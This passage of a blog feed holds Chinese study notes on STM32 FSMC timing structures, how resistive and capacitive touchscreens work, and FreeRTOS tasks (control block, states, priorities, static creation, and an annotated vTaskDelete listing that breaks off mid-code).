src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401091607943.png"></p><p>其余模式可以去官方的参考手册中查找(19.5.4).</p><h1 id="4-0-编程"><a href="#4-0-编程" class="headerlink" title="4.0 编程"></a>4.0 编程</h1><p>以上我们知道FSMC支持三类存储设备，并且这三类存储器又支持者好几种不同的模式。我们编程主要是控制时序寄存器和控制寄存器。</p><p>由于FSMC支持了三大类存储设备, 所以就是其有好几种不同的时序结构体和控制结构体.</p><p>比如说NOR flash存储器的时序结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint32_t</span> AddressSetupTime;       <span class="hljs-comment">/*地址建立时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> AddressHoldTime;        <span class="hljs-comment">/*地址保持时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> DataSetupTime;           <span class="hljs-comment">/*数据建立时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> BusTurnAroundDuration; <span class="hljs-comment">/*总线转换周期,0-0xF个HCLK周期，在NOR FLASH */</span><br><span class="hljs-type">uint32_t</span> CLKDivision;  <span class="hljs-comment">/*时钟分频因子,1-0xF，若控制异步存储器，本参数无效 */</span><br><span class="hljs-type">uint32_t</span> DataLatency;    <span class="hljs-comment">/*数据延迟时间，若控制异步存储器，本参数无效 */</span><br><span class="hljs-type">uint32_t</span> AccessMode;             <span class="hljs-comment">/*设置访问模式 */</span><br>&#125;FSMC_NORSRAMTimingInitTypeDef;<br></code></pre></td></tr></table></figure><p>需要注意的是, FSMC中的时钟设置的单位是HCLK周期数，并且可以是<code>0-0xF个</code>周期数.按STM32标准库的默认配置，HCLK的时钟频率为168MHz，即一个HCLK周期为<code>1/168 us</code>。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>触摸画板</title>
    <link href="/2024/01/07/%E8%A7%A6%E6%91%B8%E7%94%BB%E6%9D%BF/"/>
    <url>/2024/01/07/%E8%A7%A6%E6%91%B8%E7%94%BB%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="0-0-触摸屏的分类以及基本原理"><a href="#0-0-触摸屏的分类以及基本原理" class="headerlink" title="0.0 触摸屏的分类以及基本原理"></a>0.0 触摸屏的分类以及基本原理</h1><p>触控画板被划为电阻触控板和电容触控板, 相对来说，电阻屏造价便宜，能适应较恶劣的环境，但它只支持单点触控(一次只能检测面板上的一个触摸位置)，触摸时需要一定的压力， 使用久了容易造成表面磨损，影响寿命；而电容屏具有支持多点触控、检测精度高的特点，电容屏通过与导电物体产生的电容效应来检测触摸动作， 只能感应导电物体的触摸，湿度较大或屏幕表面有水珠时会影响电容屏的检测效果。</p><p>区分电阻屏与电容屏最直接的方法就是使用绝缘物体点击屏幕，因为电阻屏通过压力能正常检测触摸动作， 而该绝缘物体无法影响电容屏所检测的信号，因而无法检测到触摸动作。目前电容式触摸屏被大部分应用在智能手机、平板电脑等电子设备中， 而在汽车导航、工控机等设备中电阻式触摸屏仍占主流。</p><h2 id="0-1-电阻屏"><a href="#0-1-电阻屏" class="headerlink" title="0.1 电阻屏"></a>0.1 电阻屏</h2><p>现在我们了解一下电阻屏的主要原理. </p><p>电阻式的触摸屏结构见图 电阻式触摸屏结构。它主要由表面硬涂层、两个ITO层、间隔点以及玻璃底层构成， 这些结构层都是透明的，整个触摸屏覆盖在液晶面板上，透过触摸屏可看到液晶面板。表面涂层起到保护作用， 玻璃底层起承载的作用，而两个ITO层是触摸屏的关键结构，它们是涂有铟锡金属氧化物的导电层。 两个ITO层之间使用间隔点使两层分开，当触摸屏表面受到压力时，表面弯曲使得上层ITO与下层ITO接触，在触点处连通电路。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401072346450.png"></p><p>两个ITO涂层的两端分别引出X-、X+、Y-、Y+四个电极，见图 XY的ITO层结构 ， 这是电阻屏最常见的四线结构，通过这些电极，外部电路向这两个涂层可以施加匀强电场或检测电压。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401072346310.png"></p><h2 id="0-2-电容屏"><a href="#0-2-电容屏" class="headerlink" title="0.2 电容屏"></a>0.2 电容屏</h2><p>和电阻屏不同的是, 电容屏不需要靠压力来创造一个检测环境. 而是通过利用充电时间检测电容大小，从而通过检测出电容值的变化来获知触摸信号。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>电容屏的最上层是玻璃(不会像电阻屏那样形变)， 核心层部分也是由ITO材料构成的，这些导电材料在屏幕里构成了人眼看不见的静电网，静电网由多行X轴电极和多列Y轴电极构成，两个电极之间会形成电容。 触摸屏工作时，X轴电极发出AC交流信号，而交流信号能穿过电容，即通过Y轴能感应出该信号，当交流电穿越时电容会有充放电过程，检测该充电时间可获知电容量。 若手指触摸屏幕，会影响触摸点附近两个电极之间的耦合，从而改变两个电极之间的电容量，若检测到某电容的电容量发生了改变， 即可获知该电容处有触摸动作（这就是为什么它被称为电容式触摸屏以及绝缘体触摸没有反应的原因）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401252210078.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS(2)-任务</title>
    <link href="/2024/01/07/FreeRTOS-2-%E4%BB%BB%E5%8A%A1/"/>
    <url>/2024/01/07/FreeRTOS-2-%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>这是FreeRTOS系列学习文章的第二节，主要是关于FreeRTOS的任务相关的知识点。</p><span id="more"></span><h1 id="0-0-前言"><a href="#0-0-前言" class="headerlink" title="0.0 前言"></a>0.0 前言</h1><p><a href=""></a>中讲了任务的基础点这里就不再记载了. 但是我们要先知道在FreeRTOS中的任务在代码中是如何描述的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tskTaskControlBlock</span>       /* <span class="hljs-title">The</span> <span class="hljs-title">old</span> <span class="hljs-title">naming</span> <span class="hljs-title">convention</span> <span class="hljs-title">is</span> <span class="hljs-title">used</span> <span class="hljs-title">to</span> <span class="hljs-title">prevent</span> <span class="hljs-title">breaking</span> <span class="hljs-title">kernel</span> <span class="hljs-title">aware</span> <span class="hljs-title">debuggers</span>. */</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">volatile</span> StackType_t * pxTopOfStack; <span class="hljs-comment">/**&lt; Points to the location of the last item placed on the tasks stack.  THIS MUST BE THE FIRST MEMBER OF THE TCB STRUCT. */</span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( portUSING_MPU_WRAPPERS == 1 )</span><br>        xMPU_SETTINGS xMPUSettings; <span class="hljs-comment">/**&lt; The MPU settings are defined as part of the port layer.  THIS MUST BE THE SECOND MEMBER OF THE TCB STRUCT. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_CORE_AFFINITY == 1 ) &amp;&amp; ( configNUMBER_OF_CORES &gt; 1 )</span><br>        UBaseType_t uxCoreAffinityMask; <span class="hljs-comment">/**&lt; Used to link the task to certain cores.  UBaseType_t must have greater than or equal to the number of bits as configNUMBER_OF_CORES. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    ListItem_t xStateListItem;                  <span class="hljs-comment">/**&lt; 这个任务的状态(就绪 挂起 阻塞) The list that the state list item of a task is reference from denotes the state of that task (Ready, Blocked, Suspended ). */</span><br>    ListItem_t xEventListItem;                  <span class="hljs-comment">/**&lt; 事件列表中的位置Used to reference a task from an event list. */</span><br>    UBaseType_t uxPriority;                     <span class="hljs-comment">/**&lt; The priority of the task.  0 is the lowest priority. */</span><br>    StackType_t * pxStack;                      <span class="hljs-comment">/**&lt; 任务栈的起始位置Points to the start of the stack. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES &gt; 1 )</span><br>        <span class="hljs-keyword">volatile</span> BaseType_t xTaskRunState;      <span class="hljs-comment">/**&lt; Used to identify the core the task is running on, if the task is running. Otherwise, identifies the task&#x27;s state - not running or yielding. */</span><br>        UBaseType_t uxTaskAttributes;           <span class="hljs-comment">/**&lt; Task&#x27;s attributes - currently used to identify the idle tasks. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">char</span> pcTaskName[ configMAX_TASK_NAME_LEN ]; <span class="hljs-comment">/**&lt; Descriptive name given to the task when created.  Facilitates debugging only. */</span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TASK_PREEMPTION_DISABLE == 1 )</span><br>        BaseType_t xPreemptionDisable; <span class="hljs-comment">/**&lt; Used to prevent the task from being preempted. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( ( portSTACK_GROWTH &gt; 0 ) || ( configRECORD_STACK_HIGH_ADDRESS == 1 ) )</span><br>        StackType_t * pxEndOfStack; <span class="hljs-comment">/**&lt; Points to the highest valid address for the stack. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( portCRITICAL_NESTING_IN_TCB == 1 )</span><br>        UBaseType_t uxCriticalNesting; <span class="hljs-comment">/**&lt; Holds the critical section nesting depth for ports that do not maintain their own count in the port layer. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TRACE_FACILITY == 1 )</span><br>        UBaseType_t uxTCBNumber;  <span class="hljs-comment">/**&lt; Stores a number that increments each time a TCB is created.  It allows debuggers to determine when a task has been deleted and then recreated. */</span><br>        UBaseType_t uxTaskNumber; <span class="hljs-comment">/**&lt; Stores a number specifically for use by third party trace code. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_MUTEXES == 1 )</span><br>        UBaseType_t uxBasePriority; <span class="hljs-comment">/**&lt; The priority last assigned to the task - used by the priority inheritance mechanism. */</span><br>        UBaseType_t uxMutexesHeld;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_APPLICATION_TASK_TAG == 1 )</span><br>        TaskHookFunction_t pxTaskTag;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUM_THREAD_LOCAL_STORAGE_POINTERS &gt; 0 )</span><br>        <span class="hljs-type">void</span> * pvThreadLocalStoragePointers[ configNUM_THREAD_LOCAL_STORAGE_POINTERS ];<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configGENERATE_RUN_TIME_STATS == 1 )</span><br>        configRUN_TIME_COUNTER_TYPE ulRunTimeCounter; <span class="hljs-comment">/**&lt; Stores the amount of time the task has spent in the Running state. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_C_RUNTIME_TLS_SUPPORT == 1 )</span><br>        configTLS_BLOCK_TYPE xTLSBlock; <span class="hljs-comment">/**&lt; Memory block used as Thread Local Storage (TLS) Block for the task. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TASK_NOTIFICATIONS == 1 )<span class="hljs-comment">//每一个任务有一组任务通知</span></span><br>        <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> ulNotifiedValue[ configTASK_NOTIFICATION_ARRAY_ENTRIES ];<span class="hljs-comment">//任务通知值</span><br>        <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> ucNotifyState[ configTASK_NOTIFICATION_ARRAY_ENTRIES ];<span class="hljs-comment">//任务通知状态</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* See the comments in FreeRTOS.h with the definition of</span><br><span class="hljs-comment">     * tskSTATIC_AND_DYNAMIC_ALLOCATION_POSSIBLE. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( tskSTATIC_AND_DYNAMIC_ALLOCATION_POSSIBLE != 0 )</span><br>        <span class="hljs-type">uint8_t</span> ucStaticallyAllocated; <span class="hljs-comment">/**&lt; Set to pdTRUE if the task is a statically allocated to ensure no attempt is made to free the memory. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( INCLUDE_xTaskAbortDelay == 1 )</span><br>        <span class="hljs-type">uint8_t</span> ucDelayAborted;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_POSIX_ERRNO == 1 )</span><br>        <span class="hljs-type">int</span> iTaskErrno;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; tskTCB;<br></code></pre></td></tr></table></figure><h1 id="1-0-任务的状态"><a href="#1-0-任务的状态" class="headerlink" title="1.0 任务的状态"></a>1.0 任务的状态</h1><p>在该OS中任务主要有一下集中状态:</p><p>运行<br>当任务实际执行时，它被称为处于运行状态。 任务当前正在使用处理器。 如果运行 RTOS 的处理器只有一个内核， 那么在任何给定时间内都只能有一个任务处于运行状态。</p><p>准备就绪<br>准备就绪任务指那些能够执行（它们不处于阻塞或挂起状态）， 但目前没有执行的任务， 因为同等或更高优先级的不同任务已经处于运行状态。</p><p>阻塞<br>如果任务当前正在等待时间或外部事件，则该任务被认为处于阻塞状态。 例如，如果一个任务调用vTaskDelay()，它将被阻塞（被置于阻塞状态）， 直到延迟结束-一个时间事件。 任务也可以通过阻塞来等待队列、信号量、事件组、通知或信号量 事件。 处于阻塞状态的任务通常有一个”超时”期， 超时后任务将被超时，并被解除阻塞， 即使该任务所等待的事件没有发生。<br>“阻塞”状态下的任务不使用任何处理时间，不能 被选择进入运行状态。</p><p>挂起<br>与“阻塞”状态下的任务一样， “挂起”状态下的任务不能 被选择进入运行状态，但处于挂起状态的任务 没有超时。 相反，任务只有在分别通过 vTaskSuspend() 和 xTaskResume() API 调用明确命令时 才会进入或退出挂起状态。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401070027529.png"></p><h1 id="2-0-任务的优先级"><a href="#2-0-任务的优先级" class="headerlink" title="2.0 任务的优先级"></a>2.0 任务的优先级</h1><p>FreeRTOS使用优先级来安排任务的执行, 优先级数字越低则其优先级越低. 优先级的范围是  <code>0 到 ( configMAX_PRIORITIES - 1 ) </code>其中的 configMAX_PRIORITIES 在 FreeRTOSConfig.h 中定义。</p><h2 id="2-1-相关函数"><a href="#2-1-相关函数" class="headerlink" title="2.1 相关函数"></a>2.1 相关函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vTaskPrioritySet()<br></code></pre></td></tr></table></figure><h1 id="任务的创建"><a href="#任务的创建" class="headerlink" title="任务的创建"></a>任务的创建</h1><p>任务支持两种创建方式, 一是静态创建二是动态创建. </p><p>在FreeRTOS中，任务的创建可采用两种方法，一种是使用动态创建，另一种是使用静态创建。动态创建时，任务控制块和栈的内存是创建任务时动态分配的，任务删除时，内存可以释放。静态创建时，任务控制块和栈的内存需要事先定义好，是静态的内存，任务删除时，内存不能释放。</p><p>具体的函数如下</p><h2 id="静态创建函数"><a href="#静态创建函数" class="headerlink" title="静态创建函数"></a>静态创建函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">TaskHandle_t <span class="hljs-title function_">xTaskCreateStatic</span><span class="hljs-params">( TaskFunction_t pxTaskCode,</span><br><span class="hljs-params">                                   <span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> pcName,</span><br><span class="hljs-params">                                   <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> ulStackDepth,</span><br><span class="hljs-params">                                   <span class="hljs-type">void</span> * <span class="hljs-type">const</span> pvParameters,</span><br><span class="hljs-params">                                   UBaseType_t uxPriority,</span><br><span class="hljs-params">                                   StackType_t * <span class="hljs-type">const</span> puxStackBuffer,</span><br><span class="hljs-params">                                   StaticTask_t * <span class="hljs-type">const</span> pxTaskBuffer )</span><br></code></pre></td></tr></table></figure><p>其实这个函数只是对于函数<code>prvCreateStaticTask</code>的包装, 然后在加上一个<code>prvAddNewTaskToReadyList</code>函数, 这个函数将创建的任务添加到准备队列.</p><p>静态创建函数和动态创建函数的主要区别就是, 静态需要用户自己提供<code>stackbuffer</code>和<code>taskbuffer</code>也就是任务的栈空间、存储任务的数据结构. 也就是该函数中最后两个参数, 而这些在动态创建任务的函数中都是动态分配的. </p><p>所以静态分配的任务,在任务被删除之后是无法删掉对应的内存空间的, 但是动态分配可以. </p><p>函数的调用关系:<br><code>xTaskCreateStatic()</code>-&gt;<code>prvCreateStaticTask()</code>-&gt;<code>prvInitialiseNewTask()</code>-&gt;<code>vListInitialiseItem()</code></p><h2 id="动态分配函数"><a href="#动态分配函数" class="headerlink" title="动态分配函数"></a>动态分配函数</h2><h1 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h1><p>我们知道任务既具有四种状态, 所以我们学习如何进行状态的转换. </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401070027529.png"></p><h2 id="任务删除函数"><a href="#任务删除函数" class="headerlink" title="任务删除函数"></a>任务删除函数</h2><p>将一个任务删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskDelete</span><span class="hljs-params">( TaskHandle_t xTaskToDelete )</span><span class="hljs-comment">//任务删除函数</span><br>&#123;<br>    TCB_t * pxTCB;<br><br>    traceENTER_vTaskDelete( xTaskToDelete );<br><br>    taskENTER_CRITICAL(); <span class="hljs-comment">//进入临界区</span><br>    &#123;<br>        <span class="hljs-comment">/* If null is passed in here then it is the calling task that is</span><br><span class="hljs-comment">         * being deleted. */</span><br>        pxTCB = prvGetTCBFromHandle( xTaskToDelete );<span class="hljs-comment">//获取任务句柄xTaskToDelete所指向的具体的任务, 如果是NULL则代表自己</span><br><br>        <span class="hljs-comment">/* Remove task from the ready/delayed list. */</span><br>        <span class="hljs-keyword">if</span>( uxListRemove( &amp;( pxTCB-&gt;xStateListItem ) ) == ( UBaseType_t ) <span class="hljs-number">0</span> )<br>        &#123;<br>            taskRESET_READY_PRIORITY( pxTCB-&gt;uxPriority );<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        <span class="hljs-comment">/* Is the task waiting on an event also? */</span><br>        <span class="hljs-keyword">if</span>( listLIST_ITEM_CONTAINER( &amp;( pxTCB-&gt;xEventListItem ) ) != <span class="hljs-literal">NULL</span> )<br>        &#123;<br>            ( <span class="hljs-type">void</span> ) uxListRemove( &amp;( pxTCB-&gt;xEventListItem ) );<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        <span class="hljs-comment">/* Increment the uxTaskNumber also so kernel aware debuggers can</span><br><span class="hljs-comment">         * detect that the task lists need re-generating.  This is done before</span><br><span class="hljs-comment">         * portPRE_TASK_DELETE_HOOK() as in the Windows port that macro will</span><br><span class="hljs-comment">         * not return. */</span><br>        uxTaskNumber++;<span class="hljs-comment">//系统中任务数+1</span><br><br>        <span class="hljs-comment">/* If the task is running (or yielding), we must add it to the</span><br><span class="hljs-comment">         * termination list so that an idle task can delete it when it is</span><br><span class="hljs-comment">         * no longer running. */</span><br>        <span class="hljs-keyword">if</span>( taskTASK_IS_RUNNING_OR_SCHEDULED_TO_YIELD( pxTCB ) != pdFALSE )<span class="hljs-comment">//判断当前任务是否在运行, 其实就是判断pxTDB是否等于pxCurrentTCB</span><br>        &#123;<br>            <span class="hljs-comment">/* A running task or a task which is scheduled to yield is being</span><br><span class="hljs-comment">             * deleted. This cannot complete when the task is still running</span><br><span class="hljs-comment">             * on a core, as a context switch to another task is required.</span><br><span class="hljs-comment">             * Place the task in the termination list. The idle task will check</span><br><span class="hljs-comment">             * the termination list and free up any memory allocated by the</span><br><span class="hljs-comment">             * scheduler for the TCB and stack of the deleted task. */</span><br>            vListInsertEnd( &amp;xTasksWaitingTermination, &amp;( pxTCB-&gt;xStateListItem ) ); <span class="hljs-comment">//将任务添加到等待删除的队列, 空闲任务会去删除这些任务</span><br><br>            <span class="hljs-comment">/* Increment the ucTasksDeleted variable so the idle task knows</span><br><span class="hljs-comment">             * there is a task that has been deleted and that it should therefore</span><br><span class="hljs-comment">             * check the xTasksWaitingTermination list. */</span><br>            ++uxDeletedTasksWaitingCleanUp;<span class="hljs-comment">//等待删除的任务数</span><br><br>            <span class="hljs-comment">/* Call the delete hook before portPRE_TASK_DELETE_HOOK() as</span><br><span class="hljs-comment">             * portPRE_TASK_DELETE_HOOK() does not return in the Win32 port. */</span><br>            traceTASK_DELETE( pxTCB );<br><br>            <span class="hljs-comment">/* The pre-delete hook is primarily for the Windows simulator,</span><br><span class="hljs-comment">             * in which Windows specific clean up operations are performed,</span><br><span class="hljs-comment">             * after which it is not possible to yield away from this task -</span><br><span class="hljs-comment">             * hence xYieldPending is used to latch that a context switch is</span><br><span class="hljs-comment">             * required. */</span><br>            <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES == 1 )</span><br>                portPRE_TASK_DELETE_HOOK( pxTCB, &amp;( xYieldPendings[ <span class="hljs-number">0</span> ] ) );<br>            <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>                portPRE_TASK_DELETE_HOOK( pxTCB, &amp;( xYieldPendings[ pxTCB-&gt;xTaskRunState ] ) );<br>            <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        &#125;<br>        <span class="hljs-keyword">else</span><span class="hljs-comment">//pxTCB指向的任务不是当前任务</span><br>        &#123;<br>            --uxCurrentNumberOfTasks;<br>            traceTASK_DELETE( pxTCB );<br><br>            <span class="hljs-comment">/* Reset the next expected unblock time in case it referred to</span><br><span class="hljs-comment">             * the task that has just been deleted. */</span><br>            prvResetNextTaskUnblockTime();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES == 1 )</span><br>    &#123;<br>        taskEXIT_CRITICAL();<br><br>        <span class="hljs-comment">/* If the task is not deleting itself, call prvDeleteTCB from outside of</span><br><span class="hljs-comment">         * critical section. If a task deletes itself, prvDeleteTCB is called</span><br><span class="hljs-comment">         * from prvCheckTasksWaitingTermination which is called from Idle task. */</span><br>        <span class="hljs-keyword">if</span>( pxTCB != pxCurrentTCB )<span class="hljs-comment">//不是当前任务,直接删除</span><br>        &#123;<br>            prvDeleteTCB( pxTCB );<br>        &#125;<br><br>        <span class="hljs-comment">/* Force a reschedule if it is the currently running task that has just</span><br><span class="hljs-comment">         * been deleted. */</span><br>        <span class="hljs-keyword">if</span>( xSchedulerRunning != pdFALSE )<span class="hljs-comment">//调度器在运行</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>( pxTCB == pxCurrentTCB )<span class="hljs-comment">//指向的任务是当前执行的任务, 则切换任务</span><br>            &#123;<br>                configASSERT( uxSchedulerSuspended == <span class="hljs-number">0</span> );<br>                portYIELD_WITHIN_API();<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                mtCOVERAGE_TEST_MARKER();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* #if ( configNUMBER_OF_CORES == 1 ) */</span></span><br>    &#123;<br>        <span 